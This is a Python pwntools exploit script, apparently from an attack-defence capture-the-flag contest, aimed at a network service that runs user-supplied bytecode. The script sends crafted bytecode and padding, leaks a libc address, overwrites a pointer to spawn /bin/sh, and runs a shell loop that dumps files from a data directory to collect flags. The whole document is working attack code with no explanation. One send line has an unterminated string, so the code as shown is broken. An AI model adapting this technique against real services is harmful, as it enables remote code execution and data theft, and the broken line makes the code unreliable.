#!/usr/bin/env python3
from pwn import *

def _exploit(p):
    context.log_level = 'WARNING'
    p.recvuntil('   \\    \\_/\n    \"\"\"\"')
    p.recvuntil('\n')
    p.recvuntil('ve me your bytecode!')
    p.recvuntil('\n')
    p.recvuntil('nnon and execute it.')
    p.recvuntil('\n')
    p.recvuntil('Length:')
    p.recvuntil('\n')

    p.send('24\n')

    p.recvuntil('Bytecode:')
    p.recvuntil('\n')

    p.send('\x18\x18\x18\x17\x17\x17\x03\x15\x02\x02\x02\x02\x02\x02\x03\x02\x02\x02\x02\x02\x18\x18\x17!')
    p.send('CCCCCCCCCCCCCCCC\n
    p.send('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBBBBBBBBBBBBBBBB\n\b\x12\x00\x00\x00\x00\x00\x00')

    p.recvuntil('BBBBBBBBBBBBBBBB')
    p.recvuntil('\n')
    p.recvuntil('AAAAAAAAAAAAAAAAAAAA')
    p.recvuntil('AAAAAAAAAAAAAAAAAAAA')
    p.recvuntil('\n')
    p.recvuntil('CCCCCCCCCCCCCCCC')
    p.recvuntil('\n')
    libc_addr = int(p.recvline(False), 0x10)
    # log.info('libc address: %#x' % libc_addr)
    p.recvline(False)
    p.recvline(False)
    p.recvline(False)
    p.recvline(False)

    p.send(p64(libc_addr + 0x3288))

    p.sendline(b'DDDDDDDDDDDDDDDD\n/bin/sh;' + p64(libc_addr - 0x175d90))
    p.send('cd data; for f in *; do (read X < ${f}; echo $X); done\n')
    p.sendline('echo "ENDOFCONTENT"')
    flags = list(map(lambda s: s.decode(), filter(lambda s: s.startswith(b'FAUST_'), p.recvuntil('ENDOFCONTENT').split(b'\n'))))
    p.close()
    return flags


def exploit(addr, port):
    return _exploit(remote(addr, port))

if __name__ == '__main__':
    print(_exploit(remote('fd66:666:488::2', 7777)))
